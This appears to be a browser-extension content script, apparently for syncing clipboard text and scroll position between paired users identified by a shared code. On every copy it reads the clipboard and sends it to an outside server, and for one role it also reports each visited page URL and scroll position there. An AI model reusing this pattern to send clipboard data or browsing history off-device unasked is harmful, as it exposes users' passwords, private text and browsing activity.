var code = "1234";
var clipText = "";

chrome.storage.sync.get(['role', 'code'], function(data){
                
                if(typeof data.role != "undefined"){
                    switch(data.role){
                        case 1:
                            
                        break;
                    
                        case 2:
                           console.log('Registering 2 eventhandler');
                           if(typeof data.code != "undefined") code = data.code;
                           $(window).on("scroll click load focus", update);
                        break;
                    
                        default:
                            
                    }
                    
                }
});

document.addEventListener('copy', function(e) {
    navigator.clipboard.readText()
            .then(text => {
                clipText = text;
                console.log("yay");
                fetch("https://dummyhnr.tech:5223/setclip", {
                    method: 'post',
                    headers: new Headers({'content-type': 'application/json'}),
                    body: JSON.stringify({"clipText": clipText, "code": code})
                }).then((result) => {
                    console.log('Sent clipboard: '+clipText);
                }).catch((error) => {
                    console.error('Error:', error);
                });
            })
            .catch(err => {
                // maybe user didn't grant access to read from clipboard
                console.log('Something went wrong', err);
            });
  });

    function update(){

        
          
        let vurl = window.location.href;
        if ((window.top == window.self) && (vurl.includes('ogs.google.com') == false) && (vurl.includes('chrome-search://') == false)) {
            let scrolli = $(window).scrollTop();
            let currenturl = vurl;
            fetch("https://dummyhnr.tech:5223/setscroll", {
                method: 'post',
                headers: new Headers({'content-type': 'application/json'}),
                body: JSON.stringify({"pos": scrolli, "url": currenturl, "code": code})
            }).then((result) => {
                console.log(code+':'+scrolli+':', result);
            }).catch((error) => {
                console.error('Error:', error);
            });
        }
   }


       